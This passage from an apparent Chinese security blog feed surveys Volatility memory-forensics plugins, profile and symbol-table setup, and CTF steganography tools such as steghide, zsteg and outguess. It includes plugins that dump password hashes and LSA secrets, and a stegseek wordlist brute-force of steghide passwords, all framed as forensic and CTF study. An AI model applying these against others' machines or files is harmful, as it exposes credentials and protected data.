打印卸载的模块信息列表<br>userassist          # 打印注册表中 UserAssist 相关信息<br>userhandles         # 转储用户句柄表<br>vaddump             # 转储 VAD 数据为文件<br>vadinfo             # 转储 VAD 信息<br>vadtree             # 以树形方式显示 VAD 树信息<br>vadwalk             # 显示遍历 VAD 树<br>vboxinfo            # 转储 Virtualbox 信息（虚拟机）<br>verinfo             # 打印 PE 镜像中的版本信息<br>vmwareinfo          # 转储 VMware VMSS/VMSN 信息<br>volshell            # 内存镜像中的 shell<br>windows             # 打印桌面窗口(详细信息)<br>wintree             # Z 顺序打印桌面窗口树<br>wndscan             # 池扫描窗口站<br>yarascan            # 以 Yara 签名扫描进程或内核内存<br></code></pre></td></tr></table></figure><h3 id="Linux-内存取证插件参数"><a href="#Linux-内存取证插件参数" class="headerlink" title="Linux 内存取证插件参数"></a>Linux 内存取证插件参数</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs text"># 获取系统进程信息相关命令<br>linux_pstree        # 进程树列表<br>linux_pslist_cache  # 来自的 kmem_cache 活动进程<br>linux_psxview       # 比较进程列表<br>linux_lsof          # 打开文件描述符的每个活动进程<br>linux_pslist        # 活动的进程列表<br>linux_psaux         # 活动的进程列表（输出内容包括更多的细节）<br><br># 获取系统内存信息的相关命令<br>linux_memmap        # 内存映射文件<br>linux_pidhashtable  # Linux 内核中的 PID 散列表<br>linux_proc_maps     # 转储由-s/-vma 参数到磁盘上指定的内存范围。<br>linux_dump_map      # 进程内存的详细信息，包括堆和共享库。<br>linux_bash          # bash 历史文件<br><br># 获取网络接口信息的相关命令<br>linux_arp           # 显示 arp 列表<br>linux_ifconfig      # 显示网络接口详细情况<br>linux_route_cache   # 显示网络路由表<br>linux_netstat       # 查看网络链接情况<br><br># 获取系统硬件信息的相关命令<br>linux_cpuinfo       # 显示 cpu 的相关命令信息。<br>linux_dmesg         # 显示内核缓存信息。<br>linux_iomem         # 显示 io 设备信息。<br>linux_mount         # 显示/proc/mouns 的相关命令信息，主要是挂载的磁盘设备。<br>linux_mount_cache   # 显示 kmem_cache 的相关命令信息。<br>linux_slabinfo      # 显示/proc/slabinfo 的相关命令信息。<br><br># rootkit 检测的相关命令<br>linux_check_afinfo  # 检查篡改网络协议结构。<br>linux_check_creds   # 检查进程共享结构。<br>linux_check_fop     # 检查文件操作数据结构篡改情况。<br>linux_check_idt     # 检查中断描述符表（IDT）的篡改情况。<br>linux_check_syscall # 在系统调用表检查功能情况。<br>linux_check_modules # 检查用于从内核模块列表中缺少在 sysfs 中的项目。<br><br># 获取内核模块信息的相关命令<br>linux_lsmod         # 加载内核模块。<br>linux_tmpfs         # tmpfs 的内容。<br></code></pre></td></tr></table></figure><h3 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h3><p>Volatility自带一些<code>windows</code>系统的<code>profile</code>，<code>Linux</code>系统的<code>Profile</code>需要自己制作，也可以使用第三方的profile文件：<a href="https://github.com/KDPryor/LinuxVolProfiles">https://github.com/KDPryor/LinuxVolProfiles</a></p><p>自己制作profile的方法如下：将<code>module.dwarf</code>和<code>system.map</code>打包成一个<code>zip</code>文件，移动到<code>volatility/volatility/plugins/overlays/linux</code>目录中</p><p>以<code>centos7</code>为例</p><p>先安装<code>dwarfdump</code>（创建module.dwarf文件的依赖）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y gcc make gcc-c++ git zip elfutils-devel kernel-devel<br>yum upgrade &amp;&amp; reboot   //解决kernel-devel版本与系统版本不一致的问题<br>wget https://www.prevanders.net/libdwarf-20201201.tar.gz --no-check-certificate<br>tar -zxvf libdwarf-20201201.tar.gz<br><span class="hljs-built_in">cd</span> libdwarf-20201201<br>./configure<br>make<br>make install<br><span class="hljs-built_in">cd</span> ../<br></code></pre></td></tr></table></figure><p>在<code>volatility</code>目录中的<code>tool/Linux</code>运行<code>make</code>命令来创建<code>module.dwarf</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/volatilityfoundation/volatility.git<br><span class="hljs-built_in">cd</span> volatility/tools/linux<br>make<br><span class="hljs-built_in">ls</span> -l<br></code></pre></td></tr></table></figure><p>打包，将<code>module.dwarf</code>和<code>system.map</code>打包成<code>centos7.zip</code>，移动到分析机的<code>volatility/volatility/plugins/overlays/linux</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip centos7.zip /boot/System.map* module.dwarf<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-4.png"></p><p>ubuntu制作profile：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install -y dwarfdump build-essential<br>apt-get install -y linux-kernel-headers kernel-package<br>apt -y upgrade &amp;&amp; reboot //解决kernel-devel版本与系统版本不一致的问题<br><br><span class="hljs-built_in">cd</span> volatility/tools/linux<br>make -C /lib/modules/$(<span class="hljs-built_in">uname</span> -r)/build CONFIG_DEBUG_INFO=y M=<span class="hljs-variable">$PWD</span> modules<br>dwarfdump -di ./module.o &gt; module.dwarf<br>zip ubuntu_5.15.0-69.zip module.dwarf /boot/System.map-$(<span class="hljs-built_in">uname</span> -r)<br></code></pre></td></tr></table></figure><h2 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h2><blockquote><p>Volatility3是对Volatility2的重写，基于Python3编写，消除了对profile的依赖，使用符号表（配置文件）来匹配内存示例中的操作系统版本。</p></blockquote><h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>用于分析相关操作系统数据的内核符号表压缩包。注意：由于Linux内核易于编译且无法唯一区分它们，因此无法轻松提供详尽的Linux符号表集。官方下载地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget downloads.volatilityfoundation.org/volatility3/symbols/windows.zip<br>wget downloads.volatilityfoundation.org/volatility3/symbols/mac.zip<br>wget downloads.volatilityfoundation.org/volatility3/symbols/linux.zip<br></code></pre></td></tr></table></figure><p>解压后移动到<code>volatility3/volatility/symbols/</code></p><h3 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h3><p><a href="https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference">linux命令手册</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs text">banners.Banners                                 Attempts to identify potential linux banners in an image<br>configwriter.ConfigWriter                       Runs the automagics and both prints and outputs configuration in the output directory.<br>frameworkinfo.FrameworkInfo                     Plugin to list the various modular components of Volatility<br>isfinfo.IsfInfo                                 Determines information about the currently available ISF files, or a specific one<br>layerwriter.LayerWriter                         Runs the automagics and writes out the primary layer produced by the stacker.<br>linux.bash.Bash                                 Recovers bash command history from memory.<br>linux.check_afinfo.Check_afinfo                 Verifies the operation function pointers of network protocols.<br>linux.check_creds.Check_creds                   Checks if any processes are sharing credential structures<br>linux.check_idt.Check_idt                       Checks if the IDT has been altered<br>linux.check_modules.Check_modules               Compares module list to sysfs info, if available<br>linux.check_syscall.Check_syscall               Check system call table for hooks.<br>linux.elfs.Elfs                                 Lists all memory mapped ELF files for all processes.<br>linux.keyboard_notifiers.Keyboard_notifiers     Parses the keyboard notifier call chain<br>linux.lsmod.Lsmod                               Lists loaded kernel modules.<br>linux.lsof.Lsof                                 Lists all memory maps for all processes.<br>linux.malfind.Malfind                           Lists process memory ranges that potentially contain injected code.<br>linux.proc.Maps                                 Lists all memory maps for all processes.<br>linux.pslist.PsList                             Lists the processes present in a particular linux memory image.<br>linux.pstree.PsTree                             Plugin for listing processes in a tree based on their parent process ID.<br>linux.tty_check.tty_check                       Checks tty devices for hooks<br>mac.bash.Bash                                   Recovers bash command history from memory.<br>mac.check_syscall.Check_syscall                 Check system call table for hooks.<br>mac.check_sysctl.Check_sysctl                   Check sysctl handlers for hooks.<br>mac.check_trap_table.Check_trap_table           Check mach trap table for hooks.<br>mac.ifconfig.Ifconfig                           Lists loaded kernel modules<br>mac.kauth_listeners.Kauth_listeners             Lists kauth listeners and their status<br>mac.kauth_scopes.Kauth_scopes                   Lists kauth scopes and their status<br>mac.kevents.Kevents                             Lists event handlers registered by processes<br>mac.list_files.List_Files                       Lists all open file descriptors for all processes.<br>mac.lsmod.Lsmod                                 Lists loaded kernel modules.<br>mac.lsof.Lsof                                   Lists all open file descriptors for all processes.<br>mac.malfind.Malfind                             Lists process memory ranges that potentially contain injected code.<br>mac.mount.Mount                                 A module containing a collection of plugins that produce data typically foundin Mac&#x27;s mount command<br>mac.netstat.Netstat                             Lists all network connections for all processes.<br>mac.proc_maps.Maps                              Lists process memory ranges that potentially contain injected code.<br>mac.psaux.Psaux                                 Recovers program command line arguments.<br>mac.pslist.PsList                               Lists the processes present in a particular mac memory image.<br>mac.pstree.PsTree                               Plugin for listing processes in a tree based on their parent process ID.<br>mac.socket_filters.Socket_filters               Enumerates kernel socket filters.<br>mac.timers.Timers                               Check for malicious kernel timers.<br>mac.trustedbsd.Trustedbsd                       Checks for malicious trustedbsd modules<br>mac.vfsevents.VFSevents                         Lists processes that are filtering file system events<br>timeliner.Timeliner                             Runs all relevant plugins that provide time related information and orders the results by time.<br>windows.bigpools.BigPools                       List big page pools.<br>windows.cachedump.Cachedump                     Dumps lsa secrets from memory<br>windows.callbacks.Callbacks                     Lists kernel callbacks and notification routines.<br>windows.cmdline.CmdLine                         Lists process command line arguments.<br>windows.dlllist.DllList                         Lists the loaded modules in a particular windows memory image.<br>windows.driverirp.DriverIrp                     List IRPs for drivers in a particular windows memory image.<br>windows.driverscan.DriverScan                   Scans for drivers present in a particular windows memory image.<br>windows.dumpfiles.DumpFiles                     Dumps cached file contents from Windows memory samples.<br>windows.envars.Envars                           Display process environment variables<br>windows.filescan.FileScan                       Scans for file objects present in a particular windows memory image.<br>windows.getservicesids.GetServiceSIDs           Lists process token sids.<br>windows.getsids.GetSIDs                         Print the SIDs owning each process<br>windows.handles.Handles                         Lists process open handles.<br>windows.hashdump.Hashdump                       Dumps user hashes from memory<br>windows.info.Info                               Show OS &amp; kernel details of the memory sample being analyzed.<br>windows.lsadump.Lsadump                         Dumps lsa secrets from memory<br>windows.malfind.Malfind                         Lists process memory ranges that potentially contain injected code.<br>windows.memmap.Memmap                           Prints the memory map<br>windows.modscan.ModScan                         Scans for modules present in a particular windows memory image.<br>windows.modules.Modules                         Lists the loaded kernel modules.<br>windows.mutantscan.MutantScan                   Scans for mutexes present in a particular windows memory image.<br>windows.netscan.NetScan                         Scans for network objects present in a particular windows memory image.<br>windows.netstat.NetStat                         Traverses network tracking structures present in a particular windows memory image.<br>windows.poolscanner.PoolScanner                 A generic pool scanner plugin.<br>windows.privileges.Privs                        Lists process token privileges<br>windows.pslist.PsList                           Lists the processes present in a particular windows memory image.<br>windows.psscan.PsScan                           Scans for processes present in a particular windows memory image.<br>windows.pstree.PsTree                           Plugin for listing processes in a tree based on their parent process ID.<br>windows.registry.certificates.Certificates      Lists the certificates in the registry&#x27;s Certificate Store.<br>windows.registry.hivelist.HiveList              Lists the registry hives present in a particular memory image.<br>windows.registry.hivescan.HiveScan              Scans for registry hives present in a particular windows memory image.<br>windows.registry.printkey.PrintKey              Lists the registry keys under a hive or specific key value.<br>windows.registry.userassist.UserAssist          Print userassist registry keys and information.<br>windows.ssdt.SSDT                               Lists the system call table.<br>windows.statistics.Statistics<br>windows.strings.Strings                         Reads output from the strings command and indicates which process(es) each string belongs to.<br>windows.svcscan.SvcScan                         Scans for windows services.<br>windows.symlinkscan.SymlinkScan                 Scans for links present in a particular windows memory image.<br>windows.vadinfo.VadInfo                         Lists process memory ranges.<br>windows.vadyarascan.VadYaraScan                 Scans all the Virtual Address Descriptor memory maps using yara.<br>windows.verinfo.VerInfo                         Lists version information from PE files.<br>windows.virtmap.VirtMap                         Lists virtual mapped sections.<br>yarascan.YaraScan                               Scans kernel memory using yara rules (string or file).<br></code></pre></td></tr></table></figure><h3 id="Symbol-Tables"><a href="#Symbol-Tables" class="headerlink" title="Symbol Tables"></a>Symbol Tables</h3><p>文件以<code>JSON</code>数据的形式存储，它们可以是<code>.json</code>的纯<code>JSON</code>文件，也可以是<code>.json.gz</code>或<code>.json.xz</code> 的压缩文件。<code>Volatility</code>会在使用时自动解压它们</p><p>Volatility3找不到windows的符号表时，会从<code>Microsoft</code>的<code>Symbol Server</code>下载关联的<code>PDB</code>文件，并将其转换为适当的<code>JSON</code>格式，并将其保存在正确的位置。而linux的符号表需要自己构造，可以通过<code>dwarf2json</code>将<code>DWARF</code>文件的内核转换为适当的<code>JSON</code>文件</p><p>MacOS Processing</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./dwarf2json mac --macho /path/kernel.dSYM/Contents/Resources/DWARF/kernel \<br>    --macho-symbols /path/kernel &gt; output.json<br></code></pre></td></tr></table></figure><p>Linux Processing</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-4.4.0-137-generic &gt; output.json<br></code></pre></td></tr></table></figure><h4 id="安装vmlinux"><a href="#安装vmlinux" class="headerlink" title="安装vmlinux"></a>安装vmlinux</h4><p>linux系统默认有<code>vmlinuz</code>，但<code>vmlinux</code>与<code>vmlinuz</code>不同，需要手动安装</p><p><strong>方法一：apt安装（推荐）</strong></p><p>导入<code>GPG key</code><br><code>apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622</code></p><p>添加ddebs存储库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">codename=$(lsb_release -c | awk  <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/ddebs.list &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;      main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates  main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverse</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><p>更新软件包<br><code>apt-get update</code></p><p>安装kernel debug symbols<br><code>apt-get install linux-image-$(uname -r)-dbgsym</code></p><p>包含调试信息的文件称为<code>vmlinuxXXXdebug</code>，其中<code>XXX</code>是内核版本。该文件存储在<code>/usr/lib/debug/boot</code>下</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-6.png"></p><p><strong>方法二：手动下载安装（不推荐）</strong></p><p>在<code>http://ddebs.ubuntu.com/pool/main/l/linux/</code>找到合适的版本后下载到本地</p><p><code>dpkg -i</code>安装，安装完成同样在<code>/usr/lib/debug/boot</code>目录下</p><p>例如：</p><p><code>dpkg -i linux-image-unsigned-5.15.0-60-generic-dbgsym_5.15.0-60.66_amd64.ddeb</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-1.jpg"></p><p><strong>以上两种方法都是基于ubuntu，而在centos中安装的方法如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y yum-utils<br>debuginfo-install kernel<br></code></pre></td></tr></table></figure><p>查找vmlinux文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-5.png"></p><p>参考文章：<br><a href="https://r0fus0d.blog.ffffffff0x.com/post/memory-forensics/">内存取证(总结篇)</a><br><a href="https://xz.aliyun.com/t/11800">最近遇到的Linux内核内存取证小分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内存取证工具&quot;&gt;&lt;a href=&quot;#内存取证工具&quot; class=&quot;headerlink&quot; title=&quot;内存取证工具&quot;&gt;&lt;/a&gt;内存取证工具&lt;/h1&gt;&lt;h2 id=&quot;Volatility2&quot;&gt;&lt;a href=&quot;#Volatility2&quot; class=&quot;header</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="misc" scheme="https://www.lewiserii.top/tags/misc/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="内存取证" scheme="https://www.lewiserii.top/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    
    <category term="流量分析" scheme="https://www.lewiserii.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>misc总结(隐写篇)</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/misc%E6%80%BB%E7%BB%93(%E9%9A%90%E5%86%99%E7%AF%87).html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/misc%E6%80%BB%E7%BB%93(%E9%9A%90%E5%86%99%E7%AF%87).html</id>
    <published>2022-07-03T04:00:00.000Z</published>
    <updated>2023-03-29T07:43:42.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h1><h2 id="0x01-Exif信息隐藏"><a href="#0x01-Exif信息隐藏" class="headerlink" title="0x01 Exif信息隐藏"></a>0x01 Exif信息隐藏</h2><p>可交换图像文件格式简称exif，可以记录图片的属性信息和拍摄数据。Exif信息是可以被任意编辑的</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text">root@lewiserii-pc:~/桌面# exiftool 1.png<br>ExifTool Version Number         : 11.88<br>File Name                       : 1.png<br>Directory                       : .<br>File Size                       : 5.4 kB<br>File Modification Date/Time     : 2023:02:21 13:47:49+08:00<br>File Access Date/Time           : 2023:02:21 13:54:17+08:00<br>File Inode Change Date/Time     : 2023:02:21 13:53:15+08:00<br>File Permissions                : rwxrw-rw-<br>File Type                       : PNG<br>File Type Extension             : png<br>MIME Type                       : image/png<br>Image Width                     : 438<br>Image Height                    : 121<br>Bit Depth                       : 8<br>Color Type                      : RGB<br>Compression                     : Deflate/Inflate<br>Filter                          : Adaptive<br>Interlace                       : Noninterlaced<br>Pixels Per Unit X               : 5669<br>Pixels Per Unit Y               : 5669<br>Pixel Units                     : meters<br>Software                        : Snipaste<br>Image Size                      : 438x121<br>Megapixels                      : 0.053<br></code></pre></td></tr></table></figure><p>提取缩略图<br><code>exiftool -b -ThumbnailImage attachment.jpg &gt;flag.jpg </code></p><h2 id="0x02-文件修复"><a href="#0x02-文件修复" class="headerlink" title="0x02 文件修复"></a>0x02 文件修复</h2><p>文件头(尾)被修改或去除，需要修复文件格式</p><h2 id="0x03-文件附加"><a href="#0x03-文件附加" class="headerlink" title="0x03 文件附加"></a>0x03 文件附加</h2><p>在正常图片中插入额外的文件数据</p><p>使用工具<code>binwalk，foremost，dd</code>提取出来</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">root@lewiserii-pc:~/桌面# binwalk -e 1.png<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             PNG image, 438 x 121, 8-bit/color RGB, non-interlaced<br>91            0x5B            Zlib compressed data, default compression<br><br>root@lewiserii-pc:~/桌面# foremost 1.png<br>Processing: 1.png<br>|*|<br></code></pre></td></tr></table></figure><p>如果检测到附加的数据，<code>binwalk</code>会在当前目录下生成一个<code>_[文件名].extracted</code>目录，<code>foremost</code>会生成一个<code>output</code>目录</p><p>在复杂一点的数据插入需要手动提取或使用脚本</p><h2 id="0x04-cloacked-pixel-需要passwd"><a href="#0x04-cloacked-pixel-需要passwd" class="headerlink" title="0x04 cloacked-pixel(需要passwd)"></a>0x04 cloacked-pixel(需要passwd)</h2><p>lsb隐写的一种<br>支持PNG，JPG，BMP等图片格式</p><p>隐写后会转为PNG</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#lsb.py 98 line</span><br>steg_img.save(imgFile + <span class="hljs-string">&quot;-stego.png&quot;</span>, <span class="hljs-string">&quot;PNG&quot;</span>)<br></code></pre></td></tr></table></figure><p>加密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">$ python lsb.py hide samples/orig.jpg samples/secret.zip p@$5w0rD<br>[*] Input image size: 640x425 pixels.<br>[*] Usable payload size: 99.61 KB.<br>[+] Payload size: 74.636 KB<br>[+] Encrypted payload size: 74.676 KB<br>[+] samples/secret.zip embedded successfully!<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">$ python lsb.py<br>LSB steganogprahy. Hide files within least significant bits of images.<br><br>Usage:<br>  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;<br>  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;<br>  lsb.py analyse &lt;stego_file&gt;<br></code></pre></td></tr></table></figure><h2 id="0x05-steghide-可需要passwd"><a href="#0x05-steghide-可需要passwd" class="headerlink" title="0x05 steghide(可需要passwd)"></a>0x05 steghide(可需要passwd)</h2><p><code>steghide</code>可以将数据隐藏在图像和音频文件中</p><p>加密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">//将secret.txt文件隐藏到text.jpg中<br>steghide embed -cf test.jpg -ef secret.txt -p 123456<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">steghide extract -sf out.jpg -p 123456<br></code></pre></td></tr></table></figure><p>有些题目需要爆破steghide的密码，可以使用pyhton脚本或<a href="https://github.com/RickdeJager/stegseek">stegseek</a>工具</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">//不指定wordlist.txt时自动使用`rockyou.txt`（如果系统中有，没有会报错）<br>stegseek [stegofile.jpg] [wordlist.txt]<br></code></pre></td></tr></table></figure><h2 id="0x06-F5-steganography-需要passwd"><a href="#0x06-F5-steganography-需要passwd" class="headerlink" title="0x06 F5-steganography(需要passwd)"></a>0x06 F5-steganography(需要passwd)</h2><p>F5隐写可以将文件嵌入到BMP、GIF或JPEG图像中，需要java环境</p><p>加密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">java Embed 原图.jpg 生成图.jpg -e 隐藏的文件.txt -p &#x27;密码&#x27;<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">java Extract out.jpg -p &#x27;密码&#x27;<br></code></pre></td></tr></table></figure><p>特征</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/F5.png"></p><h2 id="0x07-zsteg"><a href="#0x07-zsteg" class="headerlink" title="0x07 zsteg"></a>0x07 zsteg</h2><p>lsb隐写，与steghide类似，可以检测PNG和BMP中的隐藏数据隐藏数据，可以快速提取隐藏信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">zsteg -a &lt;文件名&gt;<br>zsteg -e b8,a,lsb,xy 文件.png -&gt; out.png<br></code></pre></td></tr></table></figure><h2 id="0x07-outguess-可需要passwd"><a href="#0x07-outguess-可需要passwd" class="headerlink" title="0x07 outguess(可需要passwd)"></a>0x07 outguess(可需要passwd)</h2><p>加密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">outguess -k &#x27;密码&#x27; -d &lt;需要隐藏的内容&gt; 1.jpg 2.jpg<br>//1.jpg会覆盖2.jpg<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">outguess -k &#x27;密码&#x27; -r &lt;加密的图片&gt;  -t &lt;输出保存的文件&gt;<br></code></pre></td></tr></table></figure><h2 id="0x08-盲水印"><a href="#0x08-盲水印" class="headerlink" title="0x08 盲水印"></a>0x08 